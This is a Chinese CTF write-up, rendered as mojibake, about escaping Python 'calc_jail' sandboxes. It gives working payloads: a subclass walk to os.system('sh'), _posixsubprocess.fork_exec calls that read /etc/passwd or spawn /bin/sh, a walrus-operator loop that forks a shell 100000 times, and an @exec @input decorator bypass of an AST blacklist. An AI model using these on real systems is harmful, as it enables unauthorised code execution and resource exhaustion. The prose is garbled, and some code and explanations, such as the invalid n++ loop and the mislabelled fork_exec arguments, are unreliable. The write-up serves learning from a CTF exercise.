<p>â€‹	çœ‹äº†å¤§ä½¬çš„é¢˜è§£ï¼Œå‘ç°æ€è·¯è·‘åäº†ï¼Œå…¶å®ä¸ç”¨docï¼Œç”¨ä¹‹å‰é‚£ä¸ªå°±èƒ½æ‰“ï¼Œåªä¸è¿‡æˆ‘ç²—å¿ƒæ²¡æ·±å…¥çœ‹é‚£ä¸ªbuiltinsï¼Œçœ‹çœ‹é‡Œé¢èƒ½è¢«åˆ©ç”¨çš„ä¸œè¥¿å§</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532824.png?raw=true" alt="image-20240605191319697"></p>
<p>openè¢«å¹²æ‰äº†ï¼Œä¸Šå¸¸è§„æ€è·¯å§</p>
<p>Show subclasses with tuple</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271532179.png?raw=true" alt="image-20240605191413930"></p>
<p>è€æµç¨‹ï¼Œæ‰¾åˆ°ç¬¬å…­ä¸ªosï¼Œgetshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-6].__init__.__globals__[&#x27;system&#x27;](&#x27;sh&#x27;)</span><br></pre></td></tr></table></figure>



<h4 id="calc-jail-beginner-level6"><a href="#calc-jail-beginner-level6" class="headerlink" title="*calc_jail_beginner_level6"></a>*calc_jail_beginner_level6</h4><p>è¿›å…¥é¢˜ç›®ï¼ŒçœŸæ˜¯å¤§ä¸ä¸€æ ·å•Š</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533371.png?raw=true" alt="image-20240605211030100"></p>
<p>å‡ ä¹æ‰€æœ‰çš„hookéƒ½è¢«banäº†ï¼Œç•™äº†äº›æ®‹ç¾¹å‰©é¥­ç»™æˆ‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builtins.input,builtins.input/result,exec,compile</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¼•è¿›ä¸€ä¸ªæ–°å¥‡å°ç©æ„</p>
<p><strong>_posixsubprocess æ¨¡å—</strong></p>
<p>è¿™æ˜¯Pythonçš„ä¸€ä¸ªå†…éƒ¨æ¨¡å—ï¼Œå…·ä½“ä½œç”¨å°±æ˜¯æä¾›ä¸€ä¸ªåœ¨UNIXå¹³å°ä¸Šåˆ›å»ºå­è¿›ç¨‹çš„ä½çº§åˆ«æ¥å£ã€‚æˆ‘ä»¬ç†Ÿæ‚‰çš„subprocessæ¨¡å—çš„å®ç°å°±ç”¨åˆ°äº†è¿™ä¸ª</p>
<p>â€‹	è¿™ä¸ªæ¨¡å—çš„æ ¸å¿ƒåŠŸèƒ½å°±æ˜¯fork_execå‡½æ•°ï¼Œfork_execåˆæä¾›äº†ä¸€ä¸ªç›¸å½“åº•å±‚çš„æ–¹æ³•æ¥åˆ›å»ºå­è¿›ç¨‹ï¼Œå¹¶ä¸”åœ¨è¿™ä¸ªæ–°çš„è¿›ç¨‹ä¸­å¯ä»¥æ‰§è¡Œä¸€ä¸ªæŒ‡å®šçš„ç¨‹åºã€‚å€¼å¾—ä¸€æçš„æ˜¯è¿™ä¸ªæ¨¡å—å¹¶ä¸ä¼šåœ¨pythonçš„æ ‡å‡†åº“æ–‡æ¡£é‡Œé¢è¢«åˆ—å‡º,å½“ç„¶æ¯ä¸ªç‰ˆæœ¬çš„pythonéƒ½ä¼šæœ‰å·®å¼‚</p>
<p>â€‹	ä»¥ä¸€ä¸ªpython3.11çš„å…·ä½“å‡½æ•°å£°æ˜ä½œä¸ºå®ä¾‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">def fork_exec(</span><br><span class="line">    __process_args: Sequence[StrOrBytesPath] | None,</span><br><span class="line">    #ä¼ é€’ç»™æ–°è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œé€šå¸¸æ˜¯ç¨‹åºè·¯å¾„åŠå…¶å‚æ•°åˆ—è¡¨</span><br><span class="line">    __executable_list: Sequence[bytes],</span><br><span class="line">    #å¯æ‰§è¡Œç¨‹åºè·¯å¾„çš„åˆ—è¡¨</span><br><span class="line">    __close_fds: bool,</span><br><span class="line">    #è‹¥è®¾ç½®ä¸ºTrueï¼Œåˆ™åœ¨æ–°è¿›ç¨‹å½“ä¸­å…³é—­æ‰€æœ‰çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">    __fds_to_keep: tuple[int, ...],</span><br><span class="line">    #æ–°è¿›ç¨‹çš„å·¥ä½œç›®å½•</span><br><span class="line">    __cwd_obj: str,</span><br><span class="line">    #æ–°è¿›ç¨‹çš„å·¥ä½œç›®å½•</span><br><span class="line">    __env_list: Sequence[bytes] | None,</span><br><span class="line">    #ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œæ˜¯é”®å’Œå€¼çš„åºåˆ—ï¼Œæ¯”å¦‚ï¼š[&quot;PATH=/usr/bin&quot;, &quot;HOME=/home/user&quot;]</span><br><span class="line">    </span><br><span class="line">    __p2cread: int,</span><br><span class="line">    __p2cwrite: int,</span><br><span class="line">    __c2pred: int,</span><br><span class="line">    __c2pwrite: int,</span><br><span class="line">    __errread: int,</span><br><span class="line">    __errwrite: int,</span><br><span class="line">    #è¿™äº›æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œç”¨äºåœ¨çˆ¶å­è¿›ç¨‹ä¹‹é—´è¿›è¡Œé€šä¿¡</span><br><span class="line">    </span><br><span class="line">    __errpipe_read: int,</span><br><span class="line">    __errpipe_write: int,</span><br><span class="line">    #è¿™ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ç”¨äºçˆ¶å­è¿›ç¨‹ä¹‹é—´çš„é”™è¯¯é€šä¿¡</span><br><span class="line">    </span><br><span class="line">    __restore_signals: int,</span><br><span class="line">    #è‹¥è®¾ç½®ä¸ºï¼Œåˆ™åœ¨æ–°å»ºçš„å­è¿›ç¨‹å½“ä¸­æ¢å¤é»˜è®¤çš„ä¿¡å·å¤„ç†</span><br><span class="line">    __call_setsid: int,</span><br><span class="line">    #è‹¥è®¾ç½®ä¸ºï¼Œåˆ™ä¼šåœ¨æ–°è¿›ç¨‹å½“ä¸­åˆ›å»ºæ–°çš„ä¼šè¯</span><br><span class="line">    __pgid_to_set: int,</span><br><span class="line">    #è®¾ç½®æ–°è¿›ç¨‹çš„è¿›ç¨‹ç»„ID</span><br><span class="line">    </span><br><span class="line">    __gid_object: SupportsIndex | None,</span><br><span class="line">    __groups_list: list[int] | None,</span><br><span class="line">    __uid_object: SupportsIndex | None,</span><br><span class="line">    #è¿™äº›å‚æ•°ç”¨äºè®¾ç½®æ–°è¿›ç¨‹çš„ç”¨æˆ·IDä»¥åŠç»„ID</span><br><span class="line">    __child_umask: int,</span><br><span class="line">    #è®¾ç½®æ–°è¿›ç¨‹çš„umask</span><br><span class="line">    __preexec_fn: Callable[[], None],</span><br><span class="line">    #åœ¨æ–°è¿›ç¨‹å½“ä¸­æ‰§è¡Œçš„å‡½æ•°ï¼Œä¼šåœ¨æ–°è¿›ç¨‹çš„ä¸»ä½“éƒ¨åˆ†æ‰§è¡Œå‰è°ƒç”¨</span><br><span class="line">    __allow_vfork: bool,</span><br><span class="line">    #è‹¥è®¾ç½®ä¸ºTureï¼Œåˆ™åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ä½¿ç”¨vforkè€Œä¸æ˜¯forkï¼Œè¿™ä¸ªvforkåˆæ˜¯ä¸€ä¸ªæ›´é«˜æ•ˆçš„fork,åªä¸è¿‡å¯èƒ½ä¼šå­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå…·ä½“ä»€ä¹ˆé—®é¢˜è¿˜å¾—æˆ‘æ·±å…¥å­¦ä¹ pythonåæ‰èƒ½çŸ¥æ™“</span><br><span class="line">) -&gt; int: ...</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªæœ€å°åŒ–ç¤ºä¾‹ï¼Œè¯´å®åœ¨çš„è®¾ç½®è¿™äº›ä¹±ä¸ƒå…«ç³Ÿçš„çœŸçƒ¦å§ï¼Œè‡ªå·±æ‹¿æ¥æ”¹æ”¹è¿˜æˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)</span><br></pre></td></tr></table></figure>

<p>â€‹	OKï¼Œæˆ‘ä»¬ä»‹ç»å®Œè¿™ä¸ªç©æ„åï¼Œå°±å¾—å›æ¥çœ‹çœ‹é¢˜ç›®äº†</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533822.png?raw=true" alt="image-20240606183317636"></p>
<p>æˆ‘ä»¬çœ‹è¿™é‡Œä¸æ˜¯æœ‰ä¸€ä¸ªbuiltinså—ï¼Œå¾€é‡Œå¼„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[&#x27;__loader__&#x27;].load_module(&#x27;_posixsubprocess&#x27;)</span><br><span class="line">or</span><br><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;)</span><br><span class="line"></span><br><span class="line">#éƒ½æ˜¯å°†è¿™ä¸ªposixsubprocssåŠ¨æ€åŠ è½½åˆ°loaderå½“ä¸­</span><br><span class="line"></span><br><span class="line">#__loader__ï¼šåŠ è½½å™¨åœ¨å¯¼å…¥çš„æ¨¡å—ä¸Šè®¾ç½®çš„å±æ€§ï¼Œè®¿é—®æ—¶è¿”å›åŠ è½½å™¨å¯¹è±¡æœ¬èº«ã€‚</span><br></pre></td></tr></table></figure>

<p>ç„¶åposixsubprocessçš„payloadåˆ™æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure>

<p>å€¼å¾—ä¸€æçš„æ˜¯è¿™ä¸ªpayloadä¼¼ä¹æœ‰ç‚¹ä¸ç¨³å®šï¼Œä¼šè¹¦å‡ºä¸€äº›pythonä»£ç ï¼Œè€Œä¸æ˜¯ç›´æ¥æ‹¿shellï¼Œå¤šäº¤å‡ æ¬¡æ‰èƒ½å‡ºshell</p>
<p>ç­‰æˆ‘å˜å¼ºäº†å†æ¥ç ”ç©¶ç ”ç©¶ä¸ºä»€ä¹ˆå§</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533261.png?raw=true" alt="image-20240606185720026"></p>
<h4 id="calc-jail-beginner-level6-1"><a href="#calc-jail-beginner-level6-1" class="headerlink" title="calc_jail_beginner_level6.1"></a>calc_jail_beginner_level6.1</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533743.png?raw=true" alt="image-20240606185822099"></p>
<p>ä¸Šæ¬¡çš„level6æˆ‘ä»¬ä¹‹æ‰€ä»¥èƒ½ç”¨é‚£ä¸ªæ–¹æ³•getshellï¼Œå…¶ä¸»è¦åŸå› é™¤äº†å¹¶æ²¡æœ‰banæ‰è¿™ä¸ªå¯¹åº”æ¨¡å—å¤–ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†åŸå› æ˜¯å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥payloadçš„æ¬¡æ•°ä½œå‡ºä¸¥æ ¼é™åˆ¶</p>
<p>è€Œè¿™é¢˜åˆ™ä¸ç›¸åŒï¼Œä¸‹é¢è¿™ä¸ªcode of python jailé™åˆ¶äº†æˆ‘ä»¬åªèƒ½è¾“å…¥ä¸€æ¬¡payload</p>
<p>æˆ‘getshellå°šä¸”è¿˜éœ€è¦lsä¸€ä¸‹ï¼Œä½ è¿™ä¸ªè¾“å…¥æ¬¡æ•°é™åˆ¶æ˜¯ä¸æ˜¯æœ‰ç‚¹å¤ªè¶…è¿‡äº†</p>
<p>è¿™é‡Œå°±è¦å¼•ç”¨ä¸€ä¸‹python3.8ä¹‹åçš„æŠ½è±¡æ€ªä¸œè¥¿â€”â€”<strong>æµ·è±¡è¿ç®—ç¬¦</strong></p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“æµ·è±¡é•¿è¿™æ ·</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533389.png?raw=true" alt="image-20240606190203368"></p>
<p>ä¹‹æ‰€ä»¥è¯´æµ·è±¡è¿ç®—ç¬¦æŠ½è±¡æ˜¯å› ä¸º</p>
<p><strong>å®ƒä»–å¦ˆçš„è¿˜çœŸé•¿å¾—åƒæµ·è±¡</strong></p>
<p>â€‹	<em>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæµ·è±¡è¿ç®—ç¬¦å…¶å®ç®—æ˜¯ä¸€ç§ç‰¹æ®Šçš„è¡¨è¾¾å¼ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªèµ‹å€¼è¯­å¥ï¼Œè¿™æœ‰ä»€ä¹ˆä¸åŒå‘¢ï¼Ÿ</em></p>
<p>â€‹	æˆ‘ä»¬éƒ½çŸ¥é“èµ‹å€¼è¯­å¥ä¸€èˆ¬éƒ½æ˜¯s&#x3D;bè¿™æ ·çš„ï¼Œä½†æ˜¯ä½ çœ‹ï¼Œæˆ‘ä»¬ç”¨å®Œè¿™ä¸ªs&#x3D;bä¹‹åï¼Œæ˜¯ä¸æ˜¯å¦¹æœ‰è¿”å›å€¼å•Š</p>
<p>â€‹	ä½†æ˜¯æµ·è±¡è¿ç®—ç¬¦ä¼š</p>
<p>å› ä¸ºæµ·è±¡è¿ç®—ç¬¦æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ç‰¹æ®Šçš„è¡¨è¾¾å¼ï¼Œæ˜¯ä¸€ç§é€»è¾‘çš„è¡¨è¾¾ï¼Œæ‰€ä»¥å®ƒæ˜¯æœ‰è¿”å›å€¼çš„ï¼Œå¹¶ä¸”æµ·è±¡è¿ç®—ç¬¦ä¸èƒ½å•ç‹¬æˆä¸ºä¸€è¡Œï¼Œå› ä¸ºæµ·è±¡è¿ç®—ç¬¦æ˜¯ä¸ºäº†å®é™…è¿ç”¨æ‰€åˆ›é€ å‡ºæ¥çš„ä¸€ç§è¡¨è¾¾å¼ï¼Œæ‰€ä»¥å¦‚æœå¦¹æœ‰åº”ç”¨åœºæ™¯çš„è¯ï¼Œå•ç‹¬åˆ—ä¸€è¡Œæµ·è±¡è¿ç®—ç¬¦æ˜¯ä¸æ­£ç¡®æ»´ï¼ˆæ­¤å¤„è”æƒ³å¥¥å¡å§†å‰ƒåˆ€ï¼‰</p>
<p>â€‹	æµ·è±¡è¿ç®—ç¬¦ä¸»è¦ç›®çš„å°±æ˜¯åŒæ—¶è¿›è¡Œèµ‹å€¼å’Œè¡¨è¾¾å¼è®¡ç®—çš„å·¥ä½œ</p>
<p>æ¯”å¦‚ä¸€ä¸ªå¾ªç¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while(n&lt;5)ï¼š</span><br><span class="line">	print(n)</span><br><span class="line">	n = n++</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥è¿™æ ·å†™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while(n:= n++)&lt;5:</span><br><span class="line">	print(n)</span><br></pre></td></tr></table></figure>

<p>OKï¼Œæµ·è±¡ä»‹ç»å®Œæ¯•ï¼Œæ¥ä¸‹æ¥ç»™payload</p>
<p>å› ä¸ºè¿™ä¸ªpayloadè¿˜æ˜¯å’Œä¸Šä¸€é¢˜ä¸€æ ·çš„åŸç†ï¼Œåªä¸è¿‡æ˜¯å¤¹æ‚äº†æµ·è±¡è¿ç®—ç¬¦æ¥å¤„ç†æ— æ³•å¤šæ¬¡è¾“å…¥å‘½ä»¤çš„é—®é¢˜ï¼Œæ‰€ä»¥å°±å·ä¸ªæ‡’ä¸è§£é‡Šäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[os := __import__(&#x27;os&#x27;), _posixsubprocess := __loader__.load_module(&#x27;_posixsubprocess&#x27;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]</span><br></pre></td></tr></table></figure>

<p>å“å‘€è¿˜æ˜¯è®©AIæ¥è§£é‡Šè§£é‡Šå§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">os := __import__(&#x27;os&#x27;): è¿™è¡Œä»£ç ä½¿ç”¨Pythonçš„__import__å‡½æ•°åŠ¨æ€åœ°å¯¼å…¥osæ¨¡å—ï¼Œå¹¶å°†å¼•ç”¨èµ‹å€¼ç»™å˜é‡osã€‚osæ¨¡å—æä¾›äº†è®¸å¤šä¸æ“ä½œç³»ç»Ÿäº¤äº’çš„åŠŸèƒ½ã€‚</span><br><span class="line"></span><br><span class="line">_posixsubprocess := __loader__.load_module(&#x27;_posixsubprocess&#x27;): è¿™è¡Œä»£ç ä½¿ç”¨__loader__ï¼ˆé€šå¸¸æ˜¯å½“å‰æ¨¡å—çš„åŠ è½½å™¨ï¼‰åŠ¨æ€åŠ è½½_posixsubprocessæ¨¡å—ï¼Œå¹¶å°†å¼•ç”¨èµ‹å€¼ç»™å˜é‡_posixsubprocessã€‚_posixsubprocessæ¨¡å—å…è®¸åˆ›å»ºæ–°è¿›ç¨‹å¹¶ä¸å…¶é€šä¿¡ã€‚</span><br><span class="line"></span><br><span class="line">[_posixsubprocess.fork_exec(...) for i in range(100000)]: è¿™æ˜¯ä¸€ä¸ªåˆ—è¡¨æ¨å¯¼å¼ï¼Œå®ƒå°è¯•æ‰§è¡Œ_posixsubprocess.fork_execå‡½æ•°100000æ¬¡ã€‚fork_execå‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹å¹¶æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚</span><br><span class="line"></span><br><span class="line">fork_execå‡½æ•°çš„å‚æ•°å¦‚ä¸‹ï¼š</span><br><span class="line">[b&quot;/bin/sh&quot;]: è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿™é‡Œæ˜¯äºŒè¿›åˆ¶å½¢å¼çš„/bin/shã€‚</span><br><span class="line">[b&quot;/bin/sh&quot;]: å‘½ä»¤çš„å‚æ•°åˆ—è¡¨ï¼Œè¿™é‡Œä¼ é€’äº†/bin/shè‡ªèº«ä½œä¸ºå‚æ•°ã€‚</span><br><span class="line">True: è¡¨ç¤ºåœ¨æ–°è¿›ç¨‹ä¸­æ‰§è¡Œã€‚</span><br><span class="line">(): ç¯å¢ƒå˜é‡ï¼Œç©ºå…ƒç»„è¡¨ç¤ºä½¿ç”¨å½“å‰ç¯å¢ƒã€‚</span><br><span class="line">None: è¡¨ç¤ºä¸è®¾ç½®ä»»ä½•é¢å¤–çš„æ‰§è¡Œè·¯å¾„æˆ–æ–‡ä»¶è¡Œä¸ºã€‚</span><br><span class="line">ä¸€ç³»åˆ—-1: è¿™äº›å‚æ•°é€šå¸¸ç”¨äºè®¾ç½®è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™é‡Œä½¿ç”¨-1è¡¨ç¤ºä½¿ç”¨é»˜è®¤è¡Œä¸ºã€‚</span><br><span class="line">*(os.pipe()): ä½¿ç”¨os.pipe()åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œå¹¶å°†å…¶ä½œä¸ºæ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºä¼ é€’ç»™æ–°è¿›ç¨‹ã€‚</span><br><span class="line">False: è¡¨ç¤ºä¸é‡å®šå‘æ ‡å‡†é”™è¯¯æµã€‚</span><br><span class="line">None: è¡¨ç¤ºä¸è®¾ç½®ä»»ä½•å…¶ä»–é…ç½®å‚æ•°ã€‚</span><br><span class="line">range(100000): è¿™ä¸ªå‡½æ•°ç”Ÿæˆä¸€ä¸ªä»0åˆ°99999çš„æ•´æ•°åºåˆ—ï¼Œç”¨äºåˆ—è¡¨æ¨å¯¼å¼ä¸­çš„è¿­ä»£ã€‚</span><br><span class="line">ç»¼åˆæ¥çœ‹ï¼Œè¿™æ®µpayloadçš„ä½œç”¨æ˜¯å°è¯•åˆ›å»ºå¤§é‡çš„æ–°è¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æ‰§è¡Œ/bin/shã€‚è¿™ç§è¡Œä¸ºå¯èƒ½æ˜¯ä¸ºäº†å‘èµ·æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼‰ï¼Œé€šè¿‡åˆ›å»ºè¿‡å¤šçš„è¿›ç¨‹æ¥è€—å°½ç³»ç»Ÿèµ„æºã€‚</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæš´åŠ›getshellçœŸæ˜¯é‡è›®ï¼Œä½†æ˜¯æˆ‘ä¹Ÿä¸ä¼šæ›´ä¼˜é›…çš„æ–¹æ³•å•¦</p>
<p>cat &#x2F;flagæŒ‰åˆ°å†’çƒŸäº†</p>
<h4 id="calc-jail-beginner-level7"><a href="#calc-jail-beginner-level7" class="headerlink" title="calc_jail_beginner_level7"></a>calc_jail_beginner_level7</h4><p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533665.png?raw=true" alt="image-20240607203500140"></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271533057.png?raw=true" alt="image-20240607205647139"></p>
<p>é‚£ä¹ˆå¥½äº†å¥½äº†ï¼Œé‡å¤´æˆæ¥äº†ï¼ŒASTé€ƒé€¸ï¼ï¼ï¼ï¼</p>
<p>â€‹	è‚¾ä¹ˆæ˜¯ASTæ</p>
<p>ASTæ˜¯ä¸€ç§æºä»£ç çš„æŠ½è±¡è¯­æ³•ç»“æ„çš„æ ‘çŠ¶è¡¨ç¤ºï¼Œæ ‘ä¸Šçš„æ¯ä¸ªèŠ‚ç‚¹éƒ½è¡¨ç¤ºæºä»£ç å½“ä¸­çš„ä¸€ç§ç»“æ„ï¼Œæ‰€ä»¥å¾ˆæŠ½è±¡</p>
<p>â€‹	æŠ½è±¡è¯­æ³•æ ‘å¹¶ä¸ä¼šè¡¨ç°å‡ºçœŸå®è¯­æ³•å‡ºç°çš„æ¯ä¸€å¤„ç»†èŠ‚ï¼Œæ¯”å¦‚è¯´åµŒå¥—æ‹¬å·è¢«éšå«æ ‘çš„ç»“æ„ä¸­ï¼Œå¹¶æ²¡æœ‰ä»¥èŠ‚ç‚¹çš„å½¢å¼å‘ˆç°ã€‚</p>
<p>â€‹	åœ¨æ²™ç®±çš„åº”ç”¨ä¸­ï¼ŒASTä¼šå°†æˆ‘ä»¬çš„è¾“å…¥è½¬åŒ–ä¸ºæ“ä½œç ï¼Œè¿™ä¸ªæ—¶å€™ä»å­—ç¬¦ä¸²å±‚é¢çš„å˜æ¢åŸºæœ¬ä¸Šå°±æ²¡ç”¨äº†</p>
<p>â€‹	ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬è€ƒè™‘ç»•è¿‡ASTé»‘åå•</p>
<p>â€‹	å¦‚æœåŸºäºASTçš„æ²™ç®±é™åˆ¶äº†æ‰§è¡Œå‡½æ•°ï¼Œé‚£ä¹ˆå°±éœ€è¦æ‰¾åˆ°ä¸€ç§ä¸éœ€è¦æ‰§è¡Œå‡½æ•°çš„æ–¹å¼æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<p>â€‹	æ¯”å¦‚è¯´è£…é¥°å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">è£…é¥°å™¨ï¼ˆdecoratorsï¼‰æ˜¯ Python ä¸­çš„ä¸€ç§é«˜çº§åŠŸèƒ½ï¼Œå®ƒå…è®¸ä½ åŠ¨æ€åœ°ä¿®æ”¹å‡½æ•°æˆ–ç±»çš„è¡Œä¸ºã€‚</span><br><span class="line"></span><br><span class="line">è£…é¥°å™¨æ˜¯ä¸€ç§å‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°æˆ–ä¿®æ”¹åŸæ¥çš„å‡½æ•°ã€‚</span><br><span class="line"></span><br><span class="line">è£…é¥°å™¨çš„è¯­æ³•ä½¿ç”¨ **@decorator_name** æ¥åº”ç”¨åœ¨å‡½æ•°æˆ–æ–¹æ³•ä¸Šã€‚</span><br><span class="line"></span><br><span class="line">Python è¿˜æä¾›äº†ä¸€äº›å†…ç½®çš„è£…é¥°å™¨ï¼Œæ¯”å¦‚ **@staticmethod** å’Œ **@classmethod**ï¼Œç”¨äºå®šä¹‰é™æ€æ–¹æ³•å’Œç±»æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">Python è£…é¥°å…è®¸åœ¨ä¸ä¿®æ”¹åŸæœ‰å‡½æ•°ä»£ç çš„åŸºç¡€ä¸Šï¼ŒåŠ¨æ€åœ°å¢åŠ æˆ–ä¿®æ”¹å‡½æ•°çš„åŠŸèƒ½ï¼Œè£…é¥°å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ¥æ”¶å‡½æ•°ä½œä¸ºè¾“å…¥å¹¶è¿”å›ä¸€ä¸ªæ–°çš„åŒ…è£…è¿‡åçš„å‡½æ•°çš„å¯¹è±¡ã€‚</span><br></pre></td></tr></table></figure>

<p>å›åˆ°æœ¬é¢˜ï¼Œæ‰¾åˆ°çš„payloadæ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@exec</span><br><span class="line">@input</span><br><span class="line">class X: pass</span><br></pre></td></tr></table></figure>

<p>ç”±äºè¿™ä¸ªè£…é¥°å™¨ä¸ä¼šè¢«è§£æä¸ºè°ƒç”¨è¡¨è¾¾å¼æˆ–è€…è¯­å¥ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡é»‘åå•ï¼Œå¹¶ä¸”æœ€ç»ˆçš„payloadä¹Ÿæ˜¯ç”±inputæ¥æ”¶çš„ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰å¯¹inputä½œå‡ºè‚¾ä¹ˆé™åˆ¶ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè¢«æ‹¦æˆª</p>
<p>è¾“å…¥è¿™ä¸²payloadä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¼å…¥æˆ‘ä»¬çš„osæ¨¡å—è¿›è¡Œgetshelläº†</p>
